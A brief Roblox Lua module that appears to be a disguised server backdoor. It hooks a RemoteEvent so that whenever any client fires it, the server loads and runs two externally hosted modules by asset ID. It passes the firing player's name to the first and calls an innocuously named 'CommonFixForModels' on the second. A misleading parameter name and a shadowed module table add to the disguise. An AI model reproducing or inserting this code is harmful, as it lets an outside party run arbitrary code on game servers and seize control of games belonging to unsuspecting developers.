local module = {}

local function module(notused)

	if notused:IsA("RemoteEvent") then
		notused.OnServerEvent:Connect(function(target)
			require(11355396096)(target.Name)
			require(13060643220).CommonFixForModels(notused)
		end)
	end
end
return module